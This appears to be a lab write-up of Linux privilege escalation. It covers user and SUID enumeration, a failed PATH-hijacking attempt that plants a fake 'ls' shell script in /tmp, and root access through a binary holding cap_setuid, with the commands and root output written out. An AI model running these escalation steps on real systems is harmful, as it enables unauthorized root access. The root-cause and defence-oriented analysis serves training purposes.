# Privilege Escalation Walkthrough
## From SUID Misconfiguration Assessment to Capability Abuse

## Initial Access
The attacker begins with SSH access to the target system as a low-privileged user (`dev`).  
This reflects a realistic post-compromise scenario where initial credentials have already been obtained.

```bash
id
whoami
hostname
uname -a
lsb_release -a
````

### Observations

- User: `dev` (UID 1001)
    
- Distribution: Ubuntu Server (modern LTS)
    
- Architecture: x86_64
    
- No sudo privileges available
    


---

## Phase 1: User and Permission Enumeration

```bash
cat /etc/passwd
groups
sudo -l
```

### Findings

- Three human users exist: `vic`, `dev`, and `ops`
    
- Only `vic` and `ops` possess sudo privileges
    
- `dev` has no sudo access
    

Privilege escalation is therefore required to progress.

---

## Phase 2: Environment and File System Review

```bash
echo $PATH
```

The PATH includes `/usr/local/bin`, indicating the presence of administrator-installed binaries that may not follow secure coding practices.

SUID and SGID binaries were enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Standard system binaries were ignored. Attention was given only to custom or non-standard executables.

---

## Phase 3: Assessment of Custom SUID Binary (`vuln`)

A custom SUID binary located in `/usr/local/bin` was identified and analyzed.

### Static Analysis

```bash
strings /usr/local/bin/vuln
```

The presence of `system()` indicated that the binary executes external commands via a shell.

This suggests a **potential PATH hijacking class vulnerability**, historically a common escalation vector.

---

## Phase 4: Attempted SUID Exploitation (PATH Hijacking)

The following exploit hypothesis was tested:

> If the SUID binary invokes a command using `system()` without an absolute path, a malicious binary placed earlier in the PATH may be executed with elevated privileges.

### Exploitation Attempt

```bash
cd /tmp
echo -e '#!/bin/bash\n/bin/bash' > ls
chmod +x ls
export PATH=/tmp:$PATH
/usr/local/bin/vuln
```

### Result

```bash
whoami
id
```

The execution context remained unchanged (`dev`).  
No privilege escalation occurred.

Additional command substitutions (`cp`, `cat`, `date`) were also tested without success.

---

## Phase 5: Analysis of Failure

Despite the presence of `system()`, PATH hijacking did not succeed.  
This failure was expected on modern Ubuntu systems and indicates defensive hardening.

Possible explanations include:

- Use of absolute paths inside the binary (e.g., `/bin/ls`)
    
- Privilege dropping prior to command execution
    
- Environment sanitization applied to SUID contexts
    

This confirms an important principle:

> The presence of `system()` indicates a vulnerability class, not a guaranteed exploit.

The SUID binary was therefore assessed as **non-exploitable under current conditions**.

---

## Phase 6: Pivot to Capability Enumeration

Having eliminated SUID-based escalation, the focus shifted to Linux capabilities.

```bash
getcap -r / 2>/dev/null
```

### Findings

```text
/usr/local/bin/capbash cap_setuid=ep
```

Other capability-bearing binaries were identified but excluded from scope due to their network-only impact.

---

## Phase 7: Capability Abuse (`cap_setuid`)

The `capbash` binary possesses the `cap_setuid` capability, allowing it to change its effective UID without SUID.

Static analysis confirmed the use of `setuid()`:

```bash
readelf -s /usr/local/bin/capbash | grep setuid
```

This indicates that UID transitions occur via libc at runtime.

---

## Phase 8: Exploitation

From the low-privileged shell:

```bash
/usr/local/bin/capbash
```

### Verification

```bash
id
whoami
```

```text
uid=0(root) gid=1001(dev) groups=1001(dev),100(users)
root
```

Privilege escalation was successful.

---

## Root Cause

The binary directly invokes `setuid(0)` and spawns a shell while possessing `cap_setuid`.

Granting `cap_setuid` to a shell-spawning binary is functionally equivalent to granting full root access.

---

## Conclusion

This walkthrough demonstrates a realistic attacker workflow:

1. Initial enumeration
    
2. Hypothesis-driven exploitation attempt
    
3. Validation and rejection of a non-viable exploit path
    
4. Pivot to an alternative privilege escalation vector
    
5. Successful exploitation via capability abuse
    

The lab highlights the importance of **adaptation**, **verification**, and **understanding modern OS defenses**, rather than relying on outdated exploitation assumptions.
